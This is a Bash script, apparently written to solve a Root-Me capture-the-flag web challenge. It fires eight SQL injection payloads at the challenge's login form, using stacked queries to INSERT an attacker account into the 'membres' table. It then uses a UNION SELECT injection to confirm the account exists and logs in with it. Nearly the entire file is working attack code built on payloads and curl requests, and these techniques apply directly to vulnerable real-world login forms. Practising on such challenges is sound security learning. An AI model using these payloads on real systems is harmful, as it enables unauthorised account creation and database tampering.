#!/bin/bash

# ================================================
# INSERTAR USUARIO - CH30 (TODAS LAS VARIANTES)
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  INSERTAR USUARIO - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

NEW_USER="hacker"
NEW_PASS="hack123"
NEW_EMAIL="hack@test.com"

declare -a payloads=(
    "username=admin&password='; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"
    "username=admin&password='; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL') -- "
    "username=admin&password='; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')/*"
    "username='; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#&password=test"
    "username=admin&password=' UNION SELECT 1,2,3,4; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"
    "username=admin&password=' INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"
    "username=admin&password=\" INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"
    "username=admin&password=' AND 1=1; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"
)

echo -e "${YELLOW}[+] Probando ${#payloads[@]} métodos de inserción...${NC}"

for i in "${!payloads[@]}"; do
    method=$((i+1))
    echo -e "\n${BLUE}[*] Método $method:${NC} $payload"
    
    response=$(curl -s -X POST "$URL" -d "${payloads[$i]}")
    
    # Verificar si hubo error
    if echo "$response" | grep -q "error" || echo "$response" | grep -q "Warning"; then
        echo -e "${RED}[✗] Error en la consulta${NC}"
    else
        echo -e "${GREEN}[✓] Consulta ejecutada (sin errores aparentes)${NC}"
    fi
done

echo -e "\n${YELLOW}[+] Verificando si el usuario fue creado...${NC}"

# Verificar usuario
result=$(curl -s -X POST "$URL" \
    -d "username=admin&password=' UNION SELECT 1,username,pass,4 FROM membres WHERE username='$NEW_USER'#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | tr -d ' ')

if [ -n "$result" ] && [ "$result" != "--" ] && [ "$result" != "//" ]; then
    echo -e "${GREEN}[✓] USUARIO CREADO EXITOSAMENTE!${NC}"
    echo -e "${GREEN}[✓] Datos: $result${NC}"
    
    # Autenticar
    echo -e "\n${YELLOW}[+] Intentando autenticar...${NC}"
    login=$(curl -s -X POST "$URL" \
        -d "username=$NEW_USER&password=$NEW_PASS" \
        | grep -E "Membres|login failed")
    
    if echo "$login" | grep -q "Membres" && ! echo "$login" | grep -q "login failed"; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
        echo -e "${GREEN}  Usuario: $NEW_USER${NC}"
        echo -e "${GREEN}  Contraseña: $NEW_PASS${NC}"
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${RED}[✗] Autenticación fallida${NC}"
    fi
else
    echo -e "${RED}[✗] Usuario NO creado${NC}"
    echo -e "${YELLOW}[!] Posible razón: Los INSERT no están permitidos o la sintaxis es incorrecta${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DE PRUEBAS${NC}"
echo -e "${BLUE}========================================${NC}"
